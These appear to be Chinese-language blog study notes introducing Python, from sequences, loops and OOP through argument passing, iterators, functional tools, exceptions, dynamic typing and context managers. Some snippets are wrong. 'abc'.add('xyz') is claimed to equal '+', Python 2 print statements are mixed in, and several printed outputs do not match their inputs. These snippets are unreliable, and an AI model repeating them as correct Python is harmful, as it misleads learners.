序列有两种：tuple（**定值表**； 也有翻译为**元组**） 和 list (**列表**), tuple和list的主要区别在于，一旦建立，**tuple的各个元素不可再变更，而list的各个元素可以再变更**。

![image-20220609184939891](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5768622f5648936c86b88838a62aefaf-e8ba075.png)

### 索引

序列元素的下标从0开始

### 切片

获取序列的一部分数据, 范围引用： 基本样式 **[下限:上限:步长]**

![image-20220609185520375](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7ad12dac3d1daed3ad1f03d648af23e7-a782d14.png)

### 字符串

字符串是 python 比较常见的数据类型。也可以使用索引，切片等操作。元组和字符串都属于 python 中的不可变对象

![image-20220609185741894](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/61dca91cdc933b19abd759f5159ef9c1-79f045d.png)

## 运算符

| 算术运算符 | 关系运算符    | 逻辑运算符    |
| ---------- | ------------- | ------------- |
| `+` 加法   | `==` 等于     | `and` 逻辑与  |
| `-` 减法   | `!=` 不等于   | `or`   逻辑或 |
| `*` 乘法   | `>` 大于      | `not` 逻辑非  |
| `/` 除法   | `<` 小于      |               |
| `%` 取余   | `>=` 大于等于 |               |
| `**` 乘方  | `<=` 小于等于 |               |
|            | `in` 属于     |               |

## 关键字

> 通过`print(help('keywords'))`查看

|False   |            class            |   from   |             or|
| ---------- | ------------- | ------------- |------------- |
|None     |           continue        |    global  |            pass|
|True      |          def            |     if       |           raise|
|and        |         del           |      import    |          return|
|as          |        elif         |       in         |         try|
|assert       |       else        |        is          |        while|
|async         |      except     |         lambda       |       with|
|await          |     finally   |          nonlocal      |      yield|
|break           |    for      |           not           ||

## 缩进和选择

Python最具特色的是用缩进来标明成块的代码。以if选择结构来举例。if后面跟随条件，如果条件成立，则执行归属于 if 的一个代码块。

![image-20220609190359751](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dbbdfb51e973c58244050fe41104314e-44e29d0.png)

## 循环

### for循环

for循环需要预先设定好循环的次数(n)，然后执行隶属于for的语句n次。

```
for 元素 in 序列: 
    statement
```

![image-20220609190708670](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/72a0657311b3802d00ab30097f621426-e841933.png)

range()函数快速建立表

![image-20220609190930956](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/068dedd07c41f6311167e953877b6339-035faf7.png)

### while循环

while会不停地循环执行隶属于它的语句，直到条件为假(False)。

```
while 条件:
    statement
```

![image-20220609191201862](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4c800dd082c38356a2537296a58eb3f5-3b21507.png)

### 中断循环

- **continue** 在循环的某一次执行中，如果遇到`continue`, 那么跳过这一次执行，进行下一次的循环操作
- **break** 停止执行整个循环

## 函数

### 函数的定义

![image-20220609191405710](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/659323c2ebd473a8867dceded2e6704b-983f0ae.png)

```
这个函数的功能是求两个数的平方和。
首先，def，这个关键字通知python：定义一个函数。s_sum是函数名。
括号中的a, b是函数的参数，是对函数的输入。参数可以有多个，也可以完全没有（但括号要保留）。

冒号和缩进来表示的隶属关系。
    result = a**2 + b**2 # 这一句是函数内部进行的运算
    return c # 返回c的值，也就是输出的功能。Python的函数允许不使用return。
    return 可以返回多个值，以逗号分隔。相当于返回一个tuple(元组)。
    return a,b,c # 相当于 return (a,b,c)
在python中#代表注释，编译器将跳过#后的内容。

当程序执行到return的时候，程序将停止执行函数内余下的语句。
return并不是必须的，当没有return, 或者return后面没有返回值时，函数将自动返回None。
None是Python中的一个特别的数据类型，用来表示什么都没有, 多用于关键字参数传递的默认值。
```

### 函数调用和参数传递

![image-20220609191919934](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/80b8dbad9a2f82514364f88cd30d51e2-ac3b7d4.png)

```
第一个例子，将一个整数变量传递给函数，函数对它进行操作，但原整数变量a不发生变化。

第二个例子，将一个列表传递给函数，函数进行操作，原来的列表 b 发生变化。

对于基本数据类型的变量，变量传递给函数后，函数会在内存中复制一个新的变量，从而不影响原来的变量。（我们称此为值传递）

但是对于列表来说，表传递给函数的是一个指针，指针指向序列在内存中的位置，在函数中对列表的操作将在原有内存中进行，从而影响原有变量。 （我们称此为指针传递，python 中也称为 引用传递）
```

## 面向对象的基本概念

Python使用类(class)和对象(object)，进行**面向对象**（object-oriented programming，简称OOP）的编程。

### 类 Class

Python使用class关键字定义一个类

![image-20220609192349301](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1934796c06d55f3c5c945c93f1b5cf25-ff30713.png)

### 方法 method

Python中通过在类的内部定义函数，来说明方法。

![image-20220609192527039](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/27b7a4d8a457cc8c7a425f476ba21cd7-f4bb318.png)

> 参数中有一个self，它是为了方便我们引用对象自身。方法的第一个参数必须是self，无论是否用到

### 子类

在OOP中，我们通过继承(inheritance)生成子类

![image-20220609192810913](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a0ec83cd119a743f8fab59234cd73db3-0773a4d.png)

> 子类Chicken将享有父类Bird的所有属性。

## 面向对象的进一步拓展

### 调用类的其它信息

在定义方法时，必须有self这一参数。这个参数表示某个对象。对象拥有类的所有性质，那么我们可以通过**self**，调用类属性。

![image-20220609193052996](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d020dda89648da99e0a757796a3a9d1b-6ee4b44.png)

```
注意: 
在对象中对类属性进行赋值的时候，实际上会在对象定义的作用域中添加一个属性（如果还不存在的话），并不会影响到相应类中定义的同名类属性。

但如果是修改类属性的内容（比如类属性是个字典，修改字典内容）时会影响到所有对象实例，因为这个类属性的内容是共享的。
```

### `__init__()` 方法

Python有一些特殊方法。Python会特殊的对待它们。特殊方法的特点是名字前后有两个下划线

如果你在类中定义了`__init__() `这个方法，创建实例对象后，Python会**自动调用**这个方法。这个过程也叫**初始化**。

![image-20220609193556409](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/90161207579a3d9265fa12e48b4c49aa-89b7754.png)

### 对象的性质

在一些情况下，我们定义对象的性质，用于记录该对象的特别信息。比如说，人这个类。性别是某个人的一个性质，不是所有的人类都是男，或者都是女。这个**性质的值随着对象的不同而不同**。

当定义类的方法时，必须要传递一个self的参数。这个参数指代的就是类的一个对象。我们可以通过操纵self，来修改某个对象的性质。在方法内部，可以通过引用self.attribute，查询或修改对象的性质。

这样，在**类属性**的之外，又给每个对象增添了**各自特色的性质**

![image-20220609193821702](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/15811f2b16010e66b268a6b7687ec8f0-85a5cf9.png)

## Everything is Object

查看Python类信息, 可以通过两个内置函数：`dir()` 和 `help()`。

```
dir()用来查询一个类或者对象所有属性和方法
help()用来查询说明文档
```

查看list类的内置属性方法及说明文档

![image-20220609194051926](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3097f3be554c26a4c3de4af2bc604326-2ab104c.png)

![image-20220609194130879](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d9989b71be3fdea5eb5c9814df930a1f-84bbe25.png)

### list是一个类

实际上，list是一个类。每个列表都属于该类。`l1`是类list的一个对象。

![image-20220609194439202](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/454802089ea323c65532d56fd918d35f-7d309f9.png)

### 运算符是特殊方法

使用dir(list)的时候，能看到一个属性，是`__add__()`, 这个方法定义了"+"运算符对于list对象的意义，两个list的对象相加时，会进行的操作。

**运算符**，比如+, -, >, <, 以及下标引用[start:end]等等，从根本上都是定义在类内部的**方法**。

![image-20220609194829990](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3e7391a0ed36993da5a567a2263cb83d-d19426d.png)

错误信息，说明该运算符“-”没有定义。现在我们继承list类，添加对"-"的定义：

![image-20220609194927967](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/04de989a5c06219617ffc2e4c89a3c22-abc6050.png)

```
内置函数len()用来返回list所包含的元素的总数。

内置函数__sub__() 定义了“-”的操作：从第一个表中去掉第二个表中出现的元素。

如果__sub__() 已经在父类中定义，你又在子类中定义了，那么子类的对象会参考子类的定义，而不会载入父类的定义。任何其他的属性也是这样。
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python02进阶</title>
    <url>/2022/03/21/Python/Python02%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[
# Python进阶

## 词典 dictionary

### 创建词典

```python
dic = {'tom':11,'sam':45,'lily':32}
print(dic)		# {'tom': 11, 'sam': 45, 'lily': 32}
print(type(dic))	# <class 'dict'>
print(dic['sam'])	# 45
```

词典和表类似的地方，是包含有**多个元素**，每个元素以逗号分隔。但词典的元素包含有两部分，**键**和**值**，常见的是以字符串来表示键，也可以使用数字等表示键（不可变的对象可以作为键）。值可以是任意对象。键和值两者一一对应。

与表不同的是，词典的元素**没有顺序**。你**不能通过下标引用元素**。词典是**通过键来引用**。

### 词典元素的循环调用

```python
dic = {'tom':11,'sam':45,'lily':32}

for key in dic: 	# 循环调用
    print(key)
    print(dic[key])
```

> 在循环中，dict的每个键，被提取出来，赋予给key变量。

### 词典的常用方法

```python
dic = {'tom':11,'sam':45,'lily':32}

print(dic.keys())	# 返回dic所有的键	dict_keys(['tom', 'sam', 'lily'])
print(dic.values())	# 返回dic所有的值	dict_values([11, 45, 32])
print(dic.items())	# 返回dic所有的元素（键值对）dict_items([('tom', 11), ('sam', 45), ('lily', 32)])
del dic['tom']		# 删除 dic 的‘tom’元素
print(len(dic))		# 查询词典中的元素总数。
```

## 文本文件的输入输出

Python具有基本的文本文件读写功能。Python的标准库提供有更丰富的读写功能。

文本文件的读写主要通过**open()**所构建的文件对象来实现。

### 创建文件对象

```
对象名 = open(文件名，模式)
```

```
模式如下:
- r 打开只读文件，该文件必须存在。
- r+ 打开可读写的文件，该文件必须存在。
- w 打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件。
- w+ 打开可读写文件，若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件。
- a 以附加的方式打开只写文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。
- a+ 以附加方式打开可读写的文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。
- 上述的形态字符串都可以再加一个b字符，如rb、w+b或ab＋等组合，加入b 字符用来告诉函数库打开的文件为二进制文件，而非纯文字文件。
```

```python
# 如:
f = open('test.txt','r+',encoding='utf-8')
```

### 文件对象的方法

```python
f = open('test.txt','r+',encoding='utf-8')

# 读取
content = f.read(N)          # 读取N bytes的数据
content = f.readline()       # 读取一行
content = f.readlines()      # 读取所有行，储存在列表中，每个元素是一行。

# 写入
f.write('I like apple!\n')      # 将'I like apple'写入文件并换行

# 关闭文件
f.close()
```

## 模块引入

```python
# first.py
def laugh():
    print 'HaHaHaHa'

# second.py
import first   #将first文件引入
for i in range(10):
    first.laugh()
```

在`second.py`中，使用`first.py`中定义的laugh()函数。

引入模块后，可以通过 **模块.对象** 的方式来调用引入模块中的某个对象。上面例子中，`first` 为引入的模块，`laugh()` 是我们所引入的对象。

Python中还有其它的引入方式：

```python
# 引入模块a，并将模块a重命名为b
import a as b       

# 从模块a中引入function1对象。调用a中对象时，我们不用再说明模块，即直接使用function1，而不是a.function1。
from a import function1   

# 从模块a中引入所有对象。调用a中对象时，我们不用再说明模块，即直接使用对象，而不是a.对象。
from a import *           

# 包含文件层级
import dir.a as b 
```

### 模块包

可以将功能相似的模块放在同一个文件夹（比如说this_dir）中，构成一个模块包。通过

```python
import this_dir.module	# 引入this_dir文件夹中的module模块。
```

该文件夹中必须包含一个 `__init__.py` 的文件，提醒Python，该文件夹为一个模块包。`__init__.py` **可以是一个空文件**。

## 函数的参数传递

函数(function)的**参数(arguments)传递**。根据**位置**，传递对应的参数。Python还支持更多的参数传递方式。

### 关键字传递

**关键字(keyword)传递是根据每个参数的名字传递参数**。关键字并不用遵守位置的对应关系。依然沿用上面f的定义，更改调用方式：

```python
print(f(c=3,b=2,a=1))

# 关键字传递可以和位置传递混用。但位置参数要出现在关键字参数之前：
print(f(1,c=3,b=2))	
```

### 参数默认值

在**定义函数**的时候，使用形如a=19的方式，可以给参数赋予默认值(default)。如果该参数最终没有被传递值，将使用该默认值。

```python
def f(a,b,c=10):
    return a+b+c

print(f(3,2))	# 15  c没有被赋值，c将使用默认值10.
print(f(3,2,1))	# 6  c被赋值为1，不再使用默认值。
```

### 包裹传递

在**定义函数**时，我们有时候并不知道调用的时候会传递多少个参数。这时候，包裹(packing)位置参数，或者包裹关键字参数，来进行参数传递，会非常有用。

```python
def func(*name):
    print type(name)
    print name

func(1,4,6)				# <class 'tuple'>  /n    (1, 4, 5)
func(5,6,7,1,2,3)		# <class 'tuple'>  /n    (5,6,7,1,2,3)
```

在func的参数表中, 所有的参数被name收集, 根据位置合并成一个元组(tuple), 赋值给name, 这就是**包裹传递**。



```python
def func(**dict):
    print type(dict)
    print dict

func(a=1,b=9)		# <class 'dict'>   /n   {'a': 1, 'b': 2}
func(m=2,n=1,c=11)	# <class 'dict'>   /n   {'m': 1, 'n': 4, 'c': 22}
```

与上面一个例子类似，dict是一个字典，收集所有的关键字，传递给函数func。为了提醒Python，参数dict是包裹关键字传递所用的字典，**在dict前加** `**`



即 包裹传递的关键在于**定义函数时**，在相应元组或字典前加`* `或 `**` 。

### 解包裹

`*` 和 `**`，也可以在**调用的时候**使用，即**解包裹(unpacking)**, 下面为例：

```python
def func(a,b,c):
    print a,b,c

args = (1,3,4)
func(*args)
```

**在传递tuple时，让tuple的每一个元素对应一个位置参数**。在调用func时使用 * ，是为了提醒Python：要把args拆成分散的三个元素，分别传递给a,b,c



相应的，也存在对词典的解包裹，使用相同的func定义

```python
def func(a,b,c):
    print a,b,c
    
dict = {'a':1,'b':2,'c':3}
func(**dict)
```

在传递词典dict时，让词典的每个键值对作为一个关键字传递给func。

### 混合

在定义或者调用参数时，参数的几种传递方式可以混合。但在过程中要小心前后顺序。基本原则是：**先位置，再关键字，再包裹位置，再包裹关键字** 

## 循环设计

### `range()` 

```python
str = 'abcdefghijk'
for i in range(0,len(str)):
    print(i)		# 当前索引
    print(str[i])	# 索引对应的元素
```

我们利用 len() 函数和 range() 函数，用 i 作为 S 序列的下标来控制循环。在range函数中，可以分别定义上限，下限和每次循环的步长。

### `enumerate()`

利用enumerate()枚举函数，可以在每次循环中同时得到下标和元素：

```python
str = 'abcdefghijk'
for (index,char) in enumerate(str):
    print(index)	# 当前索引
    print(char)		# 索引对应的元素
```

```python
# 枚举统计文件行数
count = 0
for index,line in enumerate(open('record.txt','r',encoding='utf-8')):
    count +=1
print(count)
```

> enumerate()在每次循环中，返回的是一个包含两个元素的定值表(tuple)，两个元素分别赋予index和char。

### `zip()` 

多个等长的序列，然后想要每次循环时从各个序列分别取出一个元素，可以利用zip()

zip()函数的功能，就是从多个列表中，依次各取出一个元素。每次取出的(来自不同列表的)元素合成一个元组，合并成的元组放入zip()返回的列表中。zip()函数起到了聚合列表的功能。

```python
tupleA = [1,2,3]
tupleB = [0,9,8,7]
tupleC = ['a','b','c','d','e']
for a,b,c in zip(tupleA,tupleB,tupleC):
    # 每次循环时，从各个序列分别从左到右取出一个元素，合并成一个tuple，然后tuple的元素赋予给a,b,c 。
    print(a,b,c)
```

![image-20220610172139676](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8861e0a1a9d64b3a1c6341863ad92876-03048fc.png)



**zip_longest()** 

```python
# zip_longest() 最长列表为基准,空值指定为0而不是None
tupleA = [1,2,3]
tupleB = [0,9,8,7]
tupleC = ['a','b','c','d','e']
from itertools import zip_longest
for a,b,c in zip_longest(tupleA,tupleB,tupleC,fillvalue=0):
    print(a,b,c)
```

![image-20220610172617045](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2761926d239e8c814ab9106ee28334e4-0269d4b.png)



可以**分解**聚合后的列表，如下:

```python
# 分解聚合后的列表
tupleA = [1,2,3]
tupleB = [0,9,8]
zipped = zip(tupleA,tupleB)  # 聚合cluster
print(zipped)
na,nb = zip(*zipped)     # 解包unpack
print(na,nb)
```

![image-20220610172658993](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7222a391722a0c029d56476103f79bcb-0439fdd.png)

## 可迭代对象

### 迭代对象

迭代对象是一个包含有 `__iter__` 方法的对象。

一个可迭代对象的 `__iter__` 方法实际上返回的一个迭代器，并且如期响应 next 方法。而在迭代完成后，再次使用 `next` 时，抛出 **StopIteration错误**。

**列表其实也是一个迭代对象**，包含有 `__iter__`方法。在我们使用 `iter(lst)` 返回一个迭代器 `test_iter` 后，使用 next()方法每次迭代一个元素，到迭代完成后继续使用 `next` 抛出StopIteration。

```python
list1 = [1,2,3,4,5]
test_iter = iter(list1)
print(type(test_iter)) # class list_iterator

print(next(test_iter))
print(next(test_iter))
print(next(test_iter))
print(next(test_iter))
print(next(test_iter))
print(next(test_iter))	# StopIteration
```

![image-20220610173017166](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dd120e361192737ade01c487f3c5957c-92e6ce6.png)

### 迭代器

迭代器是包含 `__next__` 方法的任何对象，（因为包含 `__next__` 方法，因此能响应 `next` 方法）

生成器也是一种迭代器。

生成器的编写方法和函数定义类似，只是在 `return` 的地方改为 `yield`。生成器中可以有多个 `yield`。当生成器遇到一个 `yield` 时，会暂停运行生成器，返回 `yield` 后面的值。当再次调用生成器的时候，会从刚才暂停的地方继续运行，直到下一个` yield`。每次使用一个 `yield` 返回的值。

```python
# 生成器 该生成器共有三个yield， 如果用作迭代器时，会进行三次循环。
def genera():
    a = 100
    yield a
    a = a * 8
    yield a
    yield 1000

print(genera())     # generator object
for i in genera():
    print(i)
```

![image-20220610173231580](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e7984db8a99a571df650749a0941ce58-f2d7677.png)



可以写成**生成器表达式(Generator Expression)**：

```python
def genera2():
    for i in range(4):
        yield i

genera3 = (x for x in range(4))
```

![image-20220610173601786](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/37b6526dc001fefd36029d9034f1c584-78248c7.png)

### 列表推导

列表推导(list comprehension)是快速生成列表的方法。语法简单，很有实用价值。

```python
list1 = []
for i in range(10):
    list1.append(i**2)
print(list1)

list1 = [x**2 for x in range(10)] # 快捷写法 与生成器表达式类似，只不过用的是中括号
print(list1)
```

![image-20220610173855613](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1ad5dfaadd51b551619d231ac3122400-e5db0e1.png)

## 函数对象

函数也是一个对象，具有属性（可以使用dir()查询）。作为对象，它还可以赋值给其它对象名，或者作为参数传递。

### lambda函数

lambda生成一个函数对象。该函数参数为x,y，返回值为x+y。函数对象赋给func。func的调用与正常函数无异。

```python
def func1(x,y):
    return x+y

func = lambda x,y: x+y
# 以上两个函数功能相同
```

![image-20220610174230533](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b64c76ebad668f7da5032fc77ae1ef88-b107ace.png)

### 函数作为参数传递

**函数可以作为一个对象，进行参数传递**。函数名(比如func)即该对象

```python
func = lambda x,y: x+y	# 定义函数

def func2(f,a,b):	# 将函数作为参数传入
    print('test')
    print(f(a,b))	# 调用函数

# 下面两种写法相同
func2(func,2,8)
func2((lambda x,y: x+y), 4,7)
```

![image-20220610174550100](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1352d00657af5b3e88dff609e9abda3c-2a15dc2.png)

### map()函数

**map()的功能是将函数对象依次作用于表的每一个元素**，返回表存储每次作用的结果, 它的第一个参数是一个函数对象。

```python
test = map((lambda x: x**2),[1,2,3,4,5])

test2 = map((lambda x,y:x+y),[1,2,3],[4,5,6])
```

![image-20220610174907505](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/92946aa14ba176b9c72b199d7e06b3d0-1a30151.png)

### filter()函数

filter函数的第一个参数也是一个函数对象。它也是将作为参数的函数对象作用于多个元素。**如果函数对象返回的是True，则该次的元素被储存于返回的表中。** filter通过读入的函数来**筛选**数据。

```python
def bigger(a):
    if a>100:
        return True
    else:
        return False
bigNumber = filter(bigger,[10,55,1000,300,20,487])
```

![image-20220610175047285](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e00fbe10e18c5ffa1ce70ffcad38aeaf-45dec4d.png)

### reduce()函数

reduce函数的第一个参数也是函数，但有一个要求，就是这个函数自身能接收两个参数。reduce可以**累进地将函数作用于各个参数**。如下例：

```python
from functools import reduce
red = reduce((lambda x,y:x+y),[1,2,3,4,5])
print(red)  # (((1+2)+3)+4)+5
```

![image-20220610175251970](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e5eb48d75d8b89e55c6f61550d493b1e-65bc4e0.png)

```
reduce的第一个参数是lambda函数，它接收两个参数x,y, 返回x+y。

educe将表中的前两个元素(1和2)传递给lambda函数，得到3。
该返回值(3)将作为lambda函数的第一个参数，而表中的下一个元素(3)作为lambda函数的第二个参数，进行下一次的对lambda函数的调用，得到6。
依次调用lambda函数，每次lambda函数的第一个参数是上一次运算结果，而第二个参数为表中的下一个元素，直到表中没有剩余元素。
```

## 错误处理

### 异常处理

**try-except语法**:

```python
try:
    ...
except exception1:
    ...
except exception2:
    ...
except:
    ...
finally:
    ...
# 如果try中有异常发生时，将执行异常的归属，执行except。
# 异常层层比较，看是否是exception1, exception2...，直到找到其归属，执行相应的except中的语句。
# 如果except后面没有任何参数，那么表示所有的exception都交给这段程序处理。比如:
```



**报错案例**

```python
list_iter = iter(range(5))
for i in range(100):
    print(next(list_iter))    # 报错: StopIteration
```

![image-20220610175510177](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0c7047e5a5774e57930abb155f4aec78-ea28cd6.png)



**使用try-except**。在try程序段中，我们放入容易犯错的部分。我们可以跟上except，来说明如果在try部分的语句发生StopIteration时，程序该做的事情。如果没有发生异常，则except部分被跳过。

```python
list_iter = iter(range(5))
try:
    for i in range(100):
        print(next(list_iter))
except StopIteration:
    print('it is the end')
```

![image-20220610175640658](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0a2899f98614fbf310b43fe311e3108f-2ef9db7.png)



**报错流程**: try -> 异常 -> except -> finally

如果无法将异常交给合适的对象，异常将继续向上层抛出，直到被捕捉或者造成主程序报错。比如下面的程序：

```python
def test_func():
    try:
        m = 1/0
    except NameError:
        print('Catch NameError in Sub Function')    # 未定义变量

try:
    test_func()
except ZeroDivisionError:
    print('Catch Error in Main Program')
```

![image-20220610180022951](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/02ce5e209c3a6262f65f8b72740268bb-2b02e30.png)

### 抛出异常

也可以使用raise自己主动抛出异常

```python
raise StopIteration # 主动抛出异常
```

![image-20220610180308839](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f3d5a3536fb8a9ee8f2e36d9286f3293-b214336.png)

## 动态类型

动态类型(dynamic typing)。即Python的变量(variable)不需要声明，而在赋值时，变量可以重新赋值为任意值。这些都与动态类型的概念相关。

### 动态类型

**引用和对象分离**，是动态类型的核心。引用可以随时指向一个新的对象：

```python
a = 3	# 通过赋值，引用a指向对象3。
a = 'at'
```

第一个语句中，3是储存在内存中的一个整数对象。**通过赋值，引用a指向对象3**。

第二个语句中，内存中建立对象‘at’，是一个字符串(string)。引用a指向了'at'。此时，对象3不再有引用指向它。Python会自动将没有引用指向的对象销毁(destruct)，释放相应内存。

> 对于小的整数和短字符串，Python会缓存这些对象，而不是频繁的建立和销毁。

```python
a = 5
b = a		
a = a + 2
print(a,b)	# 7  5
```

**即使是多个引用指向同一个对象，如果一个引用值发生变化，那么实际上是让这个引用指向一个新的引用，并不影响其他的引用的指向**。从效果上看，就是各个引用各自独立，互不影响。



```python
L1 = [1,2,3]
L2 = L1
L1 = 2
print(L1,L2) # 2 [1, 2, 3]

L1 = [1,2,3]
L2 = L1
L1[0] = 10
print(L1,L2) # [10, 2, 3] [10, 2, 3]
```

即列表(list)和字典(dictionary)可以通过引用其元素,改变自身对象(in-place change),称为: **可变数据对象**(mutable object)

而数字/字符串, 不能改变对象本身, 只能改变引用指向, 称为**不可变数据对象**(immutable object)

元组(tuple)虽然可以调用引用元素, 但不可赋值, 所以也算不可变数据对象

### 从动态类型看函数的参数传递

函数的参数传递，本质上传递的是引用。

```python
def func(x):
    x = 100
    print(x)    

a = 1
func(a)     # 100
print(a)    # 1

def func1(x):
    x[0] = 100
    print(x)

b = [1,2,3]
func1(b)    # [100, 2, 3]
print(b)    # [100, 2, 3]
```

参数x是一个新的引用，指向a所指的对象。

如果参数是不可变(immutable)的对象，a和x引用之间相互独立。对参数x的操作不会影响引用a。

如果传递的是可变(mutable)的对象，那么改变函数参数，有可能改变原对象。所有指向原对象的引用都会受影响]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python03深入</title>
    <url>/2022/03/21/Python/Python03%E6%B7%B1%E5%85%A5/</url>
    <content><![CDATA[
# Python深入

## 特殊方法与多范式

特殊方法,或者说魔术方法, 方法名的前后各有两个下划线, 可以通过dir()查看对象拥有的特殊方法

```python
print(dir(1))
```

当对象中定义了特殊方法的时候，Python也会对它们有“特殊优待”。比如定义了`__init__()`方法的类，会在创建对象的时候自动执行`__init__()`方法中的操作。

### 运算符

Python的运算符是通过调用对象的特殊方法实现的

```python
result = 'abc' + 'xyz'
result = 'abc'.add('xyz')
print(('abc' + 'xyz') == ('abc'.add('xyz')))    # True
print(result)   # abcxyz
```

所以，在Python中，两个对象是否能进行加法运算，首先就要看相应的对象是否有`__add__()`方法。一旦相应的对象有`__add__()`方法，即使这个对象从数学上不可加，我们都可以用加法的形式，来表达`obj.__add__()`所定义的操作。在Python中，运算符起到简化书写的功能，但它依靠特殊方法实现。

Python不强制用户使用面向对象的编程方法。用户可以选择自己喜欢的使用方式 (比如选择使用+符号，还是使用更加面向对象的`__add__()`方法)。

### 内置函数

与运算符类似，许多内置函数也都是调用对象的特殊方法

```python
result = len([1,2,3])
result = [1,2,3].__len__()
print(result)   # 3
```

### 列表（list）元素引用

程序运行到li[3]的时候，Python发现并理解[]符号，然后调用`__getitem__()`方法。

```python
li = [1,2,3,4,5]
print(li[3])
print(li.__getitem__(3))	# 4
```

### 函数

函数也是一种对象。实际上，任何一个有`__call__()`特殊方法的对象都被当作是函数。比如下面的例子:

```python
class Samples(object):
    def __call__(self, a):
        return a+5

add = Samples() # add代表一个函数
print(add(2))   # 函数方式调用   7
for i in map(add,[2,3,4,5]):
    print(i)    # 7 8 9 10
```

add为SampleMore类的一个对象，当被调用时，add执行加5的操作。add还可以作为函数对象，被传递给map()函数。

## 上下文管理器

上下文管理器(context manager)是Python2.5开始支持的一种语法，用于规定某个对象的使用范围。一旦进入或者离开该使用范围，会有特殊操作被调用 (比如为对象分配或者释放内存)。它的语法形式是`with...as...`

### 关闭文件

```python
# without context manager

f = open('record1.txt','w',encoding='utf-8')
f.write('ni9ne')
print(f.closed)		# False
f.close()
print(f.closed)		# True

# with context manager
with open('record2.txt','w',encoding='utf-8') as f:
    print(f.closed)     # False
    f.write('ni9ne')
    print(f.closed)     # False
print(f.closed)         # True
```

```
两段程序实际上执行的是相同的操作。
我们的第二段程序就使用了上下文管理器 (with...as...)。
上下文管理器有隶属于它的程序块。当隶属的程序块执行结束的时候(也就是不再缩进)，上下文管理器自动关闭了文件 (我们通过f.closed来查询文件是否关闭)。
我们相当于使用缩进规定了文件对象f的使用范围。

上面的上下文管理器基于f对象的__exit__()特殊方法。
当我们使用上下文管理器的语法时，我们实际上要求Python在进入程序块之前调用对象的__enter__()方法，在结束程序块的时候调用__exit__()方法。
对于文件对象f来说，它定义了__enter__()和__exit__()方法(可以通过dir(f)看到)。
在f的__exit__()方法中，有self.close()语句。所以在使用上下文管理器时，我们就不用明文关闭f文件了。
```

### 自定义

**任何**定义了`__enter__()`和`__exit__()`方法的对象都可以用于上下文管理器。文件对象f是内置对象，所以f自动带有这两个特殊方法，不需要自定义。

```python
class MyVow(object):
    def __init__(self, text):
        self.text = text
    def __enter__(self):
        self.text = 'i say: ' + self.text
        return self
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.text = self.text + '!'

with MyVow("i'm fine") as vow:
    print(vow.text) 	# i say: i'm fine
print(vow.text) 		# i say: i'm fine!
```

在进入上下文和离开上下文时，对象的text属性发生了改变(最初的text属性是"I'm fine")。

`__enter__()`返回一个对象。上下文管理器会使用这一对象作为as所指的变量，也就是myvow。在`__enter__()`中，我们为myvow.text增加了前缀 ("I say: ")。在`__exit__()`中，我们为myvow.text增加了后缀("!")。

>注意: `__exit__()`中有四个参数。当程序块中出现**异常**(exception)，`__exit__()`的参数中exc_type, exc_value, traceback用于描述异常。我们可以根据这三个参数进行相应的处理。如果正常运行结束，这三个参数都是None。

## 对象的属性

Python一切皆对象(object)，每个对象都可能有多个属性(attribute)。Python的属性有一套统一的管理方案。

### 属性的`__dict__`系统

对象的属性储存在对象的`__dict__`属性中。`__dict__`为一个词典，键为属性名，对应的值为属性本身。

```python
class bird(object):
    feather = True

class chick(bird):
    fly = False
    def __init__(self, age):
        self.age = age

summer = chick(2)
print(bird.__dict__)
print(chick.__dict__)
print(summer.__dict__)
```

![image-20220610183336857](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/487ea3c94740f44d3e08ccc5a46b0fed-d1b9e29.png)

